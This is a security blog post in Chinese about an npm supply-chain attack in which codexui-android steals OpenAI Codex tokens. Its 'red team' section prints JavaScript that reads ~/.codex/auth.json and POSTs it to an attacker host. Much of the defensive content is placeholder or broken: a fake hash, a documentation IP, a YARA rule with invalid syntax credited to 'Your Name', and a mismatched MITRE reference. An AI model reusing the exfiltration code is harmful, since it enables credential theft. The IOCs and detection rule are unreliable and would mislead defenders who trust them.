---
layout: post
title:  "OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack"
date:   2026-06-01 11:14:10 +0000
categories: [security]
severity: critical
---

# 🚨 解析 OpenAI Codex 供應鏈攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (OpenAI Codex Authentication Tokens)
> * **關鍵技術**: npm Package Tampering, OAuth Token Exfiltration, PRoot Sandbox Escape

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: codexui-android npm package 中的惡意代碼會從使用者系統中提取 OpenAI Codex 的驗證令牌（Authentication Tokens），並將其傳送到攻擊者控制的伺服器。
* **攻擊流程圖解**:
  1. 使用者安裝 codexui-android npm package。
  2. 惡意代碼在使用者系統中執行，提取 OpenAI Codex 驗證令牌。
  3. 驗證令牌被傳送到攻擊者控制的伺服器（sentry.anyclaw[.]store）。
* **受影響元件**: OpenAI Codex、codexui-android npm package（版本 0.1.82 及以上）。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者必須安裝 codexui-android npm package，並使用 OpenAI Codex。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意代碼範例
    const fs = require('fs');
    const https = require('https');
    
    // 提取 OpenAI Codex 驗證令牌
    const authTokens = fs.readFileSync('~/.codex/auth.json', 'utf8');
    
    // 傳送驗證令牌到攻擊者控制的伺服器
    const options = {
      method: 'POST',
      hostname: 'sentry.anyclaw[.]store',
      path: '/startlog',
      headers: {
        'Content-Type': 'application/json'
      }
    };
    
    const req = https.request(options, (res) => {
      console.log(`statusCode: ${res.statusCode}`);
    });
    
    req.on('error', (error) => {
      console.error(error);
    });
    
    req.write(authTokens);
    req.end();
    
    ```
* **繞過技術**: 使用 PRoot Sandbox Escape 技術，可以繞過 Android 系統的安全限制，執行惡意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.0.2.1 |
| Domain | sentry.anyclaw[.]store |
| File Path | ~/.codex/auth.json |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule OpenAI_Codex_Token_Exfiltration {
      meta:
        description = "Detects OpenAI Codex token exfiltration"
        author = "Your Name"
      strings:
        $token_exfiltration = "sentry.anyclaw[.]store"
      condition:
        $token_exfiltration in (http_request)
    }
    
    ```
* **緩解措施**:
 1. 更新 codexui-android npm package 至最新版本。
 2. 刪除 ~/.codex/auth.json 檔案。
 3. 使用安全的驗證令牌儲存機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth Token**: OAuth 驗證令牌是一種安全的方式，允許使用者授權第三方應用程式存取其資源，而無需分享密碼。
* **PRoot Sandbox Escape**: PRoot Sandbox Escape 是一種技術，允許惡意代碼從 Android 系統的 PRoot Sandbox 中逃逸，執行任意代碼。
* **npm Package Tampering**: npm Package Tampering 是一種攻擊方式，惡意代碼會被注入到 npm package 中，當使用者安裝 package 時，惡意代碼會被執行。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/openai-codex-authentication-tokens.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


